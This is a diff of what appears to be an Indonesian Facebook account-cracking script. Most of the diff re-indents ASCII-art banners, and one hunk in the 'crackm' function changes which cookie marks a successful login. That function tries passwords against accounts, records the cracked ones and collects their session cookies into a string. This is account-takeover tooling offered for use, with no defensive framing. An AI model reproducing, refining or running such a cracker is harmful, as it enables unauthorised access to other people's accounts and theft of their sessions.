@@ -185,22 +185,22 @@ def basarii():
 
 ###----------[ BANNER 1 ]---------- ###
 def banner():
-	cetak(panel(f"""\t    [bold cyan]______  ___   _________  _______________ 
-\t    [bold cyan]| ___ \/ _ \ |___  /|  \/  || ___ \  ___|
-\t    [bold cyan]| |_/ / /_\ \   / / | .  . || |_/ / |_   
-\t    [bold cyan]| ___ \  _  |  / /  | |\/| || ___ \  _|  
-\t    [bold cyan]| |_/ / | | |./ /___| |  | || |_/ / |    
-\t    [bold cyan]\____/\_| |_/\_____/\_|  |_/\____/\_|
+	cetak(panel(f"""\t     [bold cyan]______  ___   _________  _______________ 
+\t     [bold cyan]| ___ \/ _ \ |___  /|  \/  || ___ \  ___|
+\t     [bold cyan]| |_/ / /_\ \   / / | .  . || |_/ / |_   
+\t     [bold cyan]| ___ \  _  |  / /  | |\/| || ___ \  _|  
+\t     [bold cyan]| |_/ / | | |./ /___| |  | || |_/ / |    
+\t     [bold cyan]\____/\_| |_/\_____/\_|  |_/\____/\_|
                    """,width=70,title=f"",subtitle=f"[bold cyan] 2.2 [/]",style=f"{warna_kolor}"))
 
 ###----------[ BANNER 2 ]---------- ###
 def banner2():
-	cetak(panel(f"""\t       [bold cyan]_      ____   _____ _____ _   _ 
-\t     [bold cyan] | |    / __ \ / ____|_   _| \ | |
-\t     [bold cyan] | |   | |  | | |  __  | | |  \| |
-\t     [bold cyan] | |   | |  | | | |_ | | | | . ` |
-\t     [bold cyan] | |___| |__| | |__| |_| |_| |\  |
-\t     [bold cyan] |______\____/ \_____|_____|_| \_|
+	cetak(panel(f"""\t        [bold cyan]_      ____   _____ _____ _   _ 
+\t      [bold cyan] | |    / __ \ / ____|_   _| \ | |
+\t      [bold cyan] | |   | |  | | |  __  | | |  \| |
+\t      [bold cyan] | |   | |  | | | |_ | | | | . ` |
+\t      [bold cyan] | |___| |__| | |__| |_| |_| |\  |
+\t      [bold cyan] |______\____/ \_____|_____|_| \_|
                    """,width=70,title=f"",subtitle=f"",style=f"{warna_kolor}"))
                    
 ###----------[ LOG COOKIES ]---------- ###
@@ -628,7 +628,7 @@ def crackm(idf,pwv):
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
-			elif "c_user" in ses.cookies.get_dict().keys():
+			elif "datr" in ses.cookies.get_dict().keys():
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
